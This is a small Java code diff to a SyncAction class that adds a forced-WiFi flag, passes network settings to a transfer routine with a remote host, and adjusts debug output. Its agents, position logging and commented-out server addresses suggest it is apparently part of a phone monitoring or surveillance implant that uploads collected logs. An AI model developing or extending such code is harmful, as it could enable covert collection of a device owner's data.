@@ -35,8 +35,9 @@ public class SyncAction extends SubAction {
     AgentManager agentManager;
     Transfer transfer;
 
-    boolean wifi;
-    boolean gprs;
+    protected boolean wifiForced;
+    protected boolean wifi;
+    protected boolean gprs;
 
     boolean ssl = false;
 
@@ -120,7 +121,7 @@ public class SyncAction extends SubAction {
             //host = "192.168.1.177";
             //host = "89.96.137.6";
             //host = "iperbole.suppose.it"; port = 8080;
-            transfer.init(host, port, ssl, wifi);
+            transfer.init(host, port, ssl, wifiForced, wifi, gprs);
 
             // Stop degli agenti che producono un singolo log
             agentManager.reStart(Agent.AGENT_POSITION);
@@ -174,6 +175,7 @@ public class SyncAction extends SubAction {
         try {
             gprs = databuffer.readInt() == 1;
             wifi = databuffer.readInt() == 1;
+            wifiForced = wifi;
 
             final int len = databuffer.readInt();
             final byte[] buffer = new byte[len];
@@ -191,8 +193,8 @@ public class SyncAction extends SubAction {
         //#ifdef DEBUG
         StringBuffer sb = new StringBuffer();
         sb.append("gprs: " + gprs);
-        sb.append("wifi: " + wifi);
-        sb.append("host: " + host);
+        sb.append(" wifi: " + wifi);
+        sb.append(" host: " + host);
         debug.info(sb.toString());
         //#endif
 
